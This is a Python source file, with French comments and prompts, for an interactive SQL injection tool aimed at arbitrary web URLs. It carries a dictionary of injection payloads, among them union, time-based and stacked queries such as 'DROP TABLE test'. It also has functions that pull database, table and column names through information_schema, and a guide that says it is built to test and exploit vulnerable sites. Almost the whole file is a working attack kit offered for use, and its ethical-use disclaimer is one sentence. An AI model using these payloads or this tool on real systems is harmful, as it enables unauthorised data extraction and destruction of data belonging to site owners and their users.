import requests
import time
import random
import string
from tool.main import menu_princi

SQL_PAYLOADS = {
    "error_based": [
        "' OR 1=1 --", "\" OR 1=1 --", "' OR 'a'='a", "\" OR \"a\"=\"a",
        "' AND 1=CONVERT(int, @@version) --", "' AND 1=CONVERT(int, db_name()) --",
        "'; SELECT @@version --", "\"; SELECT @@version --"
    ],
    "union_based": [
        "' UNION SELECT null, null, null --", "\" UNION SELECT null, null, null --",
        "' UNION SELECT table_name, null, null FROM information_schema.tables --"
    ],
    "boolean_based": [
        "' AND 1=1 --", "' AND 1=0 --", "\" AND 1=1 --", "\" AND 1=0 --"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5' --", "\"; WAITFOR DELAY '0:0:5' --",
        "'; SELECT pg_sleep(5) --", "\"; SELECT pg_sleep(5) --"
    ],
    "stacked_queries": [
        "'; DROP TABLE test --", "\"; DROP TABLE test --"
    ],
    "bypass_filters": [
        "' OR '1'='1' /*", "\" OR \"1\"=\"1\" /*", "'--", "\"--"
    ]
}


def random_string(length=10):
    """Génère une chaîne aléatoire de caractères."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))


def test_sql_injection(url, param, method="GET", data=None, headers=None, cookies=None):
    print(f"\n[+] Test d'injection SQL sur {url} (Paramètre: '{param}', Méthode: {method})\n")
    vulnerable = False


    if method == "POST" and data is None:
        data = {}


    for attack_type, payloads in SQL_PAYLOADS.items():
        print(f"\n[+] Test pour {attack_type} :")
        for payload in payloads:

            if method == "GET":
                test_url = url.replace(f"{param}=", f"{param}={payload}")
                print(f"[*] Test GET avec payload : {payload}")
                try:
                    response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
                except requests.exceptions.RequestException as e:
                    print(f"[!] Erreur réseau : {e}")
                    continue
            elif method == "POST":
                data[param] = payload
                test_url = url
                print(f"[*] Test POST avec payload : {payload}")
                try:
                    response = requests.post(test_url, data=data, headers=headers, cookies=cookies, timeout=5)
                except requests.exceptions.RequestException as e:
                    print(f"[!] Erreur réseau : {e}")
                    continue

            if 'response' in locals() and ("mysql" in response.text.lower() or "syntax" in response.text.lower() or "error" in response.text.lower()):
                print(f"[!!!] Injection SQL détectée avec le payload : {payload} 🚨")
                vulnerable = True
                break

            if attack_type == "time_based":
                start_time = time.time()
                try:
                    response = requests.get(test_url, headers=headers, cookies=cookies, timeout=10)
                except requests.exceptions.RequestException as e:
                    print(f"[!] Erreur réseau : {e}")
                    continue
                end_time = time.time()

                if end_time - start_time > 4:
                    print(f"[!!!] Injection SQL basée sur le temps détectée avec le payload : {payload} 🚨")
                    vulnerable = True
                    break

        if vulnerable:
            break

    return vulnerable




def extract_database(url, param, headers=None, cookies=None):
    print("[+] Tentative d'extraction de la base de données...")
    payload = "' UNION SELECT database(), null, null --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print("[*] Réponse obtenue. Voici les données :\n")
            print(response.text)
        else:
            print("[!] Échec de l'extraction de la base de données.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def extract_databases(url, param, headers=None, cookies=None):
    print("[+] Extraction des bases de données disponibles...")

    payload = "' UNION SELECT schema_name, null, null FROM information_schema.schemata --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print("[*] Bases de données trouvées :\n")
            print(response.text)
        else:
            print("[!] Échec de l'extraction des bases de données.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def extract_tables(url, param, headers=None, cookies=None):
    print("[+] Extraction des tables disponibles...")

    payload = "' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema=database() --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print("[*] Tables trouvées :\n")
            print(response.text)
        else:
            print("[!] Échec de l'extraction des tables.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def extract_columns(url, param, table, headers=None, cookies=None):
    print(f"[+] Extraction des colonnes de la table '{table}'...")

    payload = f"' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='{table}' --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print(f"[*] Colonnes trouvées dans '{table}' :\n")
            print(response.text)
        else:
            print(f"[!] Échec de l'extraction des colonnes pour la table '{table}'.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def get_custom_headers_and_cookies():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    cookies = {'session': 'your_session_cookie_here'}
    return headers, cookies


def explanation_page():
    print("""
    === Guide d'Utilisation de l'Outil SQL Injection ===

    **Introduction** : 
    Cet outil est conçu pour tester et exploiter les vulnérabilités d'injection SQL sur des sites web. Il vous permet de vérifier si une URL est vulnérable à diverses techniques d'injection SQL, d'extraire des informations comme les bases de données, les tables et les colonnes, et d'identifier les failles de sécurité potentielles.

    **Fonctionnalités disponibles :**

    1. **Tester la vulnérabilité à l'injection SQL :**
       - Cette fonctionnalité teste si un paramètre donné dans une URL (comme `id`, `page`, etc.) est vulnérable à l'injection SQL.
       - Des payloads sont envoyés sur le paramètre (par exemple `' OR 1=1 --`) pour essayer de détecter des erreurs SQL, des injections basées sur le temps ou des injections de type `union`.
       - Exemple : Si l'URL est `http://example.com?id=1`, vous pouvez tester si l'ID est vulnérable en utilisant ce paramètre dans les tests.

    2. **Extraire la base de données :**
       - Si un site est vulnérable à l'injection SQL, cette option permet d'extraire le nom de la base de données.
       - Cette méthode envoie des payloads d'union SQL pour interroger la base de données cible (par exemple, `SELECT database()`).
       - Exemple : Si vous obtenez la base de données comme `example_db`, vous pouvez continuer à explorer d'autres informations comme les tables et les colonnes.

    3. **Extraire les tables :**
       - Après avoir extrait le nom de la base de données, cette option vous permet de lister toutes les tables de cette base.
       - La requête SQL utilisée est `SELECT table_name FROM information_schema.tables`.
       - Exemple : Vous pourriez trouver des tables comme `users`, `admin`, etc., qui contiennent des informations sensibles.

    4. **Extraire les colonnes d'une table spécifique :**
       - Une fois que vous avez trouvé une table intéressante, cette option permet d'extraire les noms de colonnes de cette table.
       - Exemple : Pour une table `users`, les colonnes peuvent inclure `id`, `username`, `password`, etc.

    **Utilisation éthique** : Avant d'utiliser cet outil, assurez-vous d'avoir l'autorisation explicite du propriétaire du site pour tester ses vulnérabilités. Utilisez cet outil uniquement à des fins d'apprentissage et de tests légaux.

    """)


def interactive_tool_sql():
    print("\nBienvenue dans l'outil d'injection SQL interactif!\n")

    while True:
        print("\nQue voulez-vous faire ?")
        print("1. Tester l'injection SQL")
        print("2. Extraire les bases de données")
        print("3. Extraire les tables d'une base de données")
        print("4. Extraire les colonnes d'une table")
        print("5. Voir l'explication")
        print("6. Quitter")

        choice = input("\nEntrez votre choix (1-6): ").strip()

        if choice == '1':
            url = input("Entrez l'URL (avec le paramètre) : ")
            param = input("Entrez le paramètre à tester (par exemple 'id') : ")
            method = input("Méthode (GET ou POST) : ").strip().upper()
            if method not in ['GET', 'POST']:
                print("[!] Méthode invalide. Choisissez GET ou POST.")
                continue
            headers, cookies = get_custom_headers_and_cookies()
            vulnerable = test_sql_injection(url, param, method, headers=headers, cookies=cookies)
            if vulnerable:
                print("[+] Le site est vulnérable à l'injection SQL !")
            else:
                print("[+] Aucune vulnérabilité SQL détectée.")

        elif choice == '2':
            url = input("Entrez l'URL : ")
            param = input("Entrez le paramètre (par exemple 'id') : ")
            headers, cookies = get_custom_headers_and_cookies()
            extract_databases(url, param, headers, cookies)

        elif choice == '3':
            url = input("Entrez l'URL : ")
            param = input("Entrez le paramètre (par exemple 'id') : ")
            headers, cookies = get_custom_headers_and_cookies()
            extract_tables(url, param, headers, cookies)

        elif choice == '4':
            url = input("Entrez l'URL : ")
            param = input("Entrez le paramètre (par exemple 'id') : ")
            table = input("Entrez le nom de la table : ")
            headers, cookies = get_custom_headers_and_cookies()
            extract_columns(url, param, table, headers, cookies)

        elif choice == '5':
            explanation_page()

        elif choice == '6':
            print("Merci d'avoir utilisé l'outil SQL Injection. À bientôt!")
            menu_princi()

        else:
            print("[!] Choix invalide. Essayez encore.")
